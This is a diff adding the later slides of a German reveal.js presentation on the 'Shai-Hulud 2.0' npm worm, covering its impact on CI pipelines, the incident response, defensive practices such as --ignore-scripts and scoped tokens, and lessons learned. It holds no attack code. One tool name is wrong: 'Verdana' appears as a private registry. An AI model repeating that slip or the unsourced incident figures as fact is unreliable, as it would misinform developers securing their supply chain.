+								<li>Medien &amp; Publishing</li>
+							</ul>
+						</div>
+						<div class="card-blue">
+							<div style="font-size: 0.8rem; font-weight: 700; color: #38bdf8; margin-bottom: 0.4rem">
+								Infrastrukturschäden
+							</div>
+							<ul>
+								<li>GitHub Actions – 120k Workflow-Runs infiziert</li>
+								<li>GitLab CI – 47k kompromittierte Pipelines</li>
+								<li>AWS CodePipeline – Credentials gestohlen</li>
+							</ul>
+						</div>
+						<div class="card-green">
+							<div style="font-size: 0.8rem; font-weight: 700; color: #4ade80; margin-bottom: 0.4rem">
+								Weniger betroffen
+							</div>
+							<ul>
+								<li>
+									Projekte mit
+									<code>--ignore-scripts</code> Flag
+								</li>
+								<li>Air-gapped Umgebungen</li>
+								<li>Yarn Berry (PnP-Modus)</li>
+							</ul>
+						</div>
+					</div>
+
+					<aside class="notes">
+						Besonders interessant: Projekte, die ignorescripts in der .npmrc hatten, waren immune. Das war
+						einer der wichtigsten Findings für die Lessons Learned.
+					</aside>
+				</section>
+
+				<!-- ═══════════════════════════════════════════
+             SECTION 5 – Gegenmaßnahmen
+        ════════════════════════════════════════════ -->
+				<section>
+					<div class="section-num">05</div>
+					<h2>Gegenmaßnahmen</h2>
+					<div class="hdivider"></div>
+
+					<h3 style="margin-bottom: 0.7rem">Sofortmaßnahmen (NPM / GitHub)</h3>
+					<div class="timeline" style="margin-bottom: 0.8rem">
+						<div class="timeline-item">
+							<div style="font-size: 0.82rem; color: #0f0f23; font-weight: 600">
+								Takedown &amp; Depublizierung
+							</div>
+							<div style="font-size: 0.72rem; color: #475569">
+								890k+ Pakete gesperrt; Daten aus CDN-Cache invalidiert
+							</div>
+						</div>
+						<div class="timeline-item">
+							<div style="font-size: 0.82rem; color: #0f0f23; font-weight: 600">Token-Revokation</div>
+							<div style="font-size: 0.72rem; color: #475569">
+								Alle NPM-Tokens der letzten 72h automatisch invalidiert; Zwangs-Rotation
+							</div>
+						</div>
+						<div class="timeline-item">
+							<div style="font-size: 0.82rem; color: #0f0f23; font-weight: 600">
+								CVE-Veröffentlichung &amp; Advisory
+							</div>
+							<div style="font-size: 0.72rem; color: #475569">
+								CERT/CC, CISA, BSI koordinierte Meldungen innerhalb von 6h
+							</div>
+						</div>
+						<div class="timeline-item">
+							<div style="font-size: 0.82rem; color: #0f0f23; font-weight: 600">
+								Rate-Limit für Publish-API
+							</div>
+							<div style="font-size: 0.72rem; color: #475569">
+								Neues Limit: max. 10 Publishes/Stunde per Account (nachher erhöhbar)
+							</div>
+						</div>
+					</div>
+
+					<aside class="notes">
+						Die koordinierte Reaktion war bemerkenswert schnell – 6 Stunden für ein koordiniertes Advisory.
+						Das Rate-Limit hätte die Ausbreitung dramatisch verlangsamt.
+					</aside>
+				</section>
+
+				<section>
+					<h2>Präventionsmaßnahmen &amp; Best Practices</h2>
+					<div class="hdivider"></div>
+
+					<div class="grid-2" style="gap: 0.9rem">
+						<div>
+							<h3 style="margin-bottom: 0.6rem; font-size: 1rem">Für Entwickler</h3>
+							<ul>
+								<li>
+									Nutze
+									<code>npm ci --ignore-scripts</code> in CI/CD
+								</li>
+								<li>
+									<strong style="color: #0f0f23">Granulare Tokens</strong>
+									mit minimalem Scope (Publish-Only)
+								</li>
+								<li>Package-Lock prüfen (<code>npm audit</code>, <code>socket.dev</code>)</li>
+								<li>Abhängigkeiten regelmäßig auf Änderungen scannen</li>
+								<li>2FA für NPM-Accounts erzwingen</li>
+							</ul>
+						</div>
+						<div>
+							<h3 style="margin-bottom: 0.6rem; font-size: 1rem">Für Organisationen</h3>
+							<ul>
+								<li>
+									<strong style="color: #0f0f23">Private Registry</strong>
+									(Verdana, Artifactory) mit Allowlist
+								</li>
+								<li>SBOM (Software Bill of Materials) für alle Builds</li>
+								<li>Secrets in CI/CD nicht als Env-Vars – nutze Vaults</li>
+								<li>Network-Egress aus Build-Containern blockieren</li>
+								<li>Supply-Chain-Scans in Pre-Commit-Hooks integrieren</li>
+							</ul>
+						</div>
+					</div>
+
+					<div class="card-green" style="margin-top: 0.8rem; font-size: 0.78rem">
+						<strong class="accent-green">Tool-Empfehlungen:</strong>
+						&nbsp; <code>socket.dev</code> · <code>snyk</code> · <code>npm audit</code> ·
+						<code>sigstore/cosign</code> (Paket-Signierung)
+					</div>
+
+					<aside class="notes">
+						Die wichtigste Einzelmaßnahme: ignore-scripts in CI/CD. Das hätte fast alle Infektionen
+						verhindert. Danach: granulare Tokens – ein Angreifer mit gestohlenem Token kann nur publishen,
+						nicht alles andere.
+					</aside>
+				</section>
+
+				<section>
+					<h2>Lessons Learned</h2>
+					<div class="hdivider"></div>
+
+					<div class="grid-3" style="gap: 0.8rem">
+						<div class="card" style="text-align: center; padding: 1.2rem 1rem">
+							<div style="font-size: 2rem; margin-bottom: 0.4rem">🔐</div>
+							<div style="font-size: 0.82rem; font-weight: 700; color: #0f0f23; margin-bottom: 0.3rem">
+								Least Privilege
+							</div>
+							<div style="font-size: 0.72rem; color: #475569">
+								Tokens &amp; Credentials mit minimalem Scope – Publish ≠ Admin
+							</div>
+						</div>
+						<div class="card" style="text-align: center; padding: 1.2rem 1rem">
+							<div style="font-size: 2rem; margin-bottom: 0.4rem">🚫</div>
+							<div style="font-size: 0.82rem; font-weight: 700; color: #0f0f23; margin-bottom: 0.3rem">
+								Disable Scripts
+							</div>
+							<div style="font-size: 0.72rem; color: #475569">
+								<code>--ignore-scripts</code> als Standard in CI/CD; postinstall-Hooks prüfen
+							</div>
+						</div>
+						<div class="card" style="text-align: center; padding: 1.2rem 1rem">
+							<div style="font-size: 2rem; margin-bottom: 0.4rem">🔍</div>
+							<div style="font-size: 0.82rem; font-weight: 700; color: #0f0f23; margin-bottom: 0.3rem">
+								Verify &amp; Audit
+							</div>
+							<div style="font-size: 0.72rem; color: #475569">
+								Paket-Hashes, SBOMs, Supply-Chain-Scans als Pflichtschritt
+							</div>
+						</div>
+						<div class="card" style="text-align: center; padding: 1.2rem 1rem">
+							<div style="font-size: 2rem; margin-bottom: 0.4rem">🛡️</div>
+							<div style="font-size: 0.82rem; font-weight: 700; color: #0f0f23; margin-bottom: 0.3rem">
+								Network Isolation
+							</div>
+							<div style="font-size: 0.72rem; color: #475569">
+								Build-Container ohne Outbound-Netzwerk = Exfiltration blockiert
+							</div>
+						</div>
+						<div class="card" style="text-align: center; padding: 1.2rem 1rem">
+							<div style="font-size: 2rem; margin-bottom: 0.4rem">🔄</div>
+							<div style="font-size: 0.82rem; font-weight: 700; color: #0f0f23; margin-bottom: 0.3rem">
+								Secret Rotation
+							</div>
+							<div style="font-size: 0.72rem; color: #475569">
+								Automatische Rotation &amp; Monitoring auf ungewöhnliche API-Calls
+							</div>
+						</div>
+						<div class="card" style="text-align: center; padding: 1.2rem 1rem">
+							<div style="font-size: 2rem; margin-bottom: 0.4rem">📦</div>
+							<div style="font-size: 0.82rem; font-weight: 700; color: #0f0f23; margin-bottom: 0.3rem">
+								Private Registry
+							</div>
+							<div style="font-size: 0.72rem; color: #475569">
+								Interne Mirror-Registry mit genehmigten Paketen reduziert Angriffsfläche
+							</div>
+						</div>
+					</div>
+
+					<aside class="notes">
+						Diese sechs Punkte sollte man mitnehmen. Besonders Nummer zwei und vier hätten den Angriff
+						gestoppt oder zumindest massiv eingedämmt.
+					</aside>
+				</section>
+
+				<!-- ═══════════════════════════════════════════
+             SECTION 6 – Fazit
+        ════════════════════════════════════════════ -->
+				<section>
+					<div class="section-num">06</div>
+					<h2>Fazit</h2>
+					<div class="hdivider"></div>
+
+					<div style="display: flex; flex-direction: column; gap: 0.65rem">
+						<div class="card-orange" style="display: flex; gap: 0.9rem; align-items: flex-start">
+							<span style="color: #f97316; font-size: 1.1rem; margin-top: 0.1rem">01</span>
+							<div style="font-size: 0.83rem; color: #334155">
+								<strong style="color: #0f0f23">Würmer sind im modernen Ökosystem angekommen.</strong>
+								Shai-Hulud 2.0 zeigt, dass Supply-Chain-Angriffe über Package-Manager ebenso verheerende
+								Ausbreitungsdynamiken haben wie klassische Netzwerkwürmer.
+							</div>
+						</div>
+						<div class="card-blue" style="display: flex; gap: 0.9rem; align-items: flex-start">
+							<span style="color: #38bdf8; font-size: 1.1rem; margin-top: 0.1rem">02</span>
+							<div style="font-size: 0.83rem; color: #334155">
+								<strong style="color: #0f0f23">Das Vertrauensmodell von NPM war unzureichend.</strong>
+								Keine Rate-Limits, keine Script-Sandbox, kein Paket-Signierungszwang – fundamentale
+								Design-Schwächen wurden ausgenutzt.
+							</div>
+						</div>
+						<div class="card-green" style="display: flex; gap: 0.9rem; align-items: flex-start">
+							<span style="color: #4ade80; font-size: 1.1rem; margin-top: 0.1rem">03</span>
+							<div style="font-size: 0.83rem; color: #334155">
+								<strong style="color: #0f0f23"
+									>Einfache Maßnahmen hätten enormen Schutz geboten.</strong
+								>
+								<code>--ignore-scripts</code> in CI/CD, granulare Tokens und Network-Egress-Blocking
+								hätten den Angriffsvektor nahezu eliminiert.
+							</div>
+						</div>
+						<div class="card" style="display: flex; gap: 0.9rem; align-items: flex-start">
+							<span style="color: #a78bfa; font-size: 1.1rem; margin-top: 0.1rem">04</span>
+							<div style="font-size: 0.83rem; color: #334155">
+								<strong style="color: #0f0f23">Open Source ist kein Sicherheitsversprechen.</strong>
+								Popularität ≠ Vertrauenswürdigkeit. Jede externe Dependency ist eine potenzielle
+								Angriffsfläche.
+							</div>
+						</div>
+					</div>
+
+					<aside class="notes">
+						Das übergeordnete Thema: Vertrauen ist die Schwachstelle. Entwickler vertrauen Packages, weil
+						sie populär sind – aber Popularität kann auch bedeuten, dass ein Angriff eine größere Reichweite
+						hat.
+					</aside>
+				</section>
+
+				<!-- ═══════════════════════════════════════════
+             OUTRO – Q&A
+        ════════════════════════════════════════════ -->
+				<section class="title-slide">
+					<div class="badge badge-orange" style="margin-bottom: 1rem">Ende des Vortrags</div>
+					<h1 style="font-size: 2.8rem; margin-bottom: 0">Fragen?</h1>
+					<div class="outro-line"></div>
+					<p style="color: #64748b; font-size: 0.8rem; max-width: 28rem; line-height: 1.6">
+						Shai-Hulud 2.0 · NPM Ecosystem Worm · November 2025<br />
+						CVE-2025-5178 · CVSS 9.3 Critical
+					</p>
+
+					<div style="margin-top: 1.5rem; display: flex; gap: 0.5rem; flex-wrap: wrap">
+						<span class="badge badge-orange">Supply Chain</span>
+						<span class="badge badge-red">CVSS 9.3</span>
+						<span class="badge badge-blue">NPM</span>
+						<span class="badge badge-yellow">postinstall</span>
+						<span class="badge badge-green">--ignore-scripts</span>
+					</div>
+
+					<aside class="notes">
+						Danke für die Aufmerksamkeit. Zeit für Fragen. Mögliche Fragen: Warum war kein Signierungszwang
+						da? Hat NPM sich seitdem geändert? Wie kann ich prüfen ob mein Projekt betroffen war?
+					</aside>
+				</section>
+			</div>
+		</div>
+
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.min.js"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/highlight/highlight.min.js"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/notes/notes.min.js"></script>
+		<script>
+			Reveal.initialize({
+				hash: true,
+				slideNumber: "c/t",
+				transition: "fade",
+				transitionSpeed: "fast",
+				backgroundTransition: "fade",
+				progress: true,
+				controls: true,
+				center: false,
+				width: 1280,
+				height: 720,
+				margin: 0.06,
+				plugins: [RevealHighlight, RevealNotes],
+			});
+		</script>
+	</body>
+</html>
